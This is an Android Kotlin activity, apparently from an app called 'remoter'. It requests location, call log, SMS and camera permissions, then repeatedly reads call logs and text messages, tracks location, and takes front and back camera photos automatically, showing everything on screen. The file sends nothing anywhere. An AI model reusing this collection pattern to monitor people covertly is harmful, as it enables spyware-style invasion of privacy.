package com.heilang.remoter

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import androidx.core.content.ContextCompat
import com.heilang.remoter.ui.theme.RemoterTheme
import androidx.compose.ui.graphics.ImageBitmap
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.foundation.Image

class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        CameraCapture.initializeExecutor()
        // Request location permission
        val requestPermissionLauncher = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
            if (permissions[Manifest.permission.ACCESS_FINE_LOCATION] == true || permissions[Manifest.permission.ACCESS_COARSE_LOCATION] == true ||
                permissions[Manifest.permission.READ_CALL_LOG] == true || permissions[Manifest.permission.READ_SMS] == true || permissions[Manifest.permission.CAMERA] == true) {
                // Permission granted
                setContent {
                    RemoterTheme {
                        LocationTrackingHandler()
                    }
                }
            } else {
                // Permission denied
                Toast.makeText(this, "Location and Call Log permission are required.", Toast.LENGTH_SHORT).show()
            }
        }

        // Request permissions on launch
        requestPermissionLauncher.launch(
            arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_SMS,
                Manifest.permission.CAMERA,
                Manifest.permission.WRITE_EXTERNAL_STORAGE
            )
        )
    }
    override fun onDestroy() {
        super.onDestroy()
        CameraCapture.shutdownExecutor()
    }
}

@Composable
fun LocationTrackingHandler() {
    val context = LocalContext.current
    val locationText = remember { mutableStateOf("Fetching location...") }
    val callLogs = remember { mutableStateOf<List<CallLogEntry>>(emptyList()) }
    val handler = remember { Handler(Looper.getMainLooper()) }
    val messageLogs = remember { mutableStateOf<List<MessageLogEntry>>(emptyList()) }
    val frontCameraImage = remember { mutableStateOf<ImageBitmap?>(null) }
    val backCameraImage = remember { mutableStateOf<ImageBitmap?>(null) }
    LaunchedEffect(Unit) {
        // Ensure permission is granted
        if (ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED || ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            try {
                // Start fetching the location and repeat after each completion
                fetchLocationOnceAndRepeat(context, locationText)
            } catch (e: SecurityException) {
                locationText.value = "Permission denied"
            }
        } else {
            Toast.makeText(context, "Permissions are denied.", Toast.LENGTH_SHORT).show()
        }

        // Handle call logs fetching
        if (ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_CALL_LOG
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            // Start periodic fetching of call logs and location every 10 seconds
            val runnable = object : Runnable {
                override fun run() {
                    // Fetch call logs
                    CallLogFetcher.fetchCallLogs(context, callLogs)

                    // Schedule next fetch after 10 seconds
                    handler.postDelayed(this, 10000)
                }
            }
            // Start the first fetch
            handler.post(runnable)
        } else {
            Toast.makeText(context, "Permissions are denied.", Toast.LENGTH_SHORT).show()
        }
        if (ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_SMS
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            // Start periodic fetching of message logs every 10 seconds
            val messageLogRunnable = object : Runnable {
                override fun run() {
                    // Fetch message logs
                    MessageFetcher.fetchMessageLogs(context, messageLogs)

                    // Schedule next fetch after 10 seconds
                    handler.postDelayed(this, 10000)
                }
            }
            // Start the first fetch
            handler.post(messageLogRunnable)
        }
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
            // Capture image from front camera
            try {
                CameraCapture.captureImageFromCamera(context, isFrontCamera = true) { image ->
                    frontCameraImage.value = image
                    // After capturing front camera image, capture back camera image
                    CameraCapture.captureImageFromCamera(context, isFrontCamera = false) { backImage ->
                        backCameraImage.value = backImage
                    }
                }
            } catch (e: Exception) {
                Log.e("CameraError", "Failed to capture front camera image", e)
            }

        } else {
            Toast.makeText(context, "Camera permission is denied.", Toast.LENGTH_SHORT).show()
        }
    }

    Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
        LazyColumn(modifier = Modifier.padding(innerPadding)) {
            // Location information
            item {
                Text(
                    text = "Location: ${locationText.value}",
                    modifier = Modifier.padding(8.dp)
                )
            }

            // LazyColumn to display all call logs
            items(callLogs.value) { callLog ->
                Column(modifier = Modifier.padding(8.dp)) {
                    Text(text = "Number: ${callLog.number}")
                    Text(text = "Type: ${callLog.type}")
                    Text(text = "Date: ${callLog.date}")
                }
            }

            // LazyColumn to display all message logs
            items(messageLogs.value) { messageLog ->
                Column(modifier = Modifier.padding(8.dp)) {
                    Text(text = "Address: ${messageLog.address}")
                    Text(text = "Body: ${messageLog.body}")
                    Text(text = "Date: ${messageLog.date}")
                }
            }

            // Display front camera captured image if available
            frontCameraImage.value?.let {
                item {
                    Image(bitmap = it, contentDescription = "Front Camera Image", modifier = Modifier.padding(8.dp))
                }
            }

            // Display the back camera captured image if available
            backCameraImage.value?.let {
                item {
                    Image(bitmap = it, contentDescription = "Back Camera Image", modifier = Modifier.padding(8.dp))
                }
            }

        }
    }
}

@Preview(showBackground = true)
@Composable
fun LocationTrackingHandlerPreview() {
    RemoterTheme {
        Text("Preview content here")
    }
}
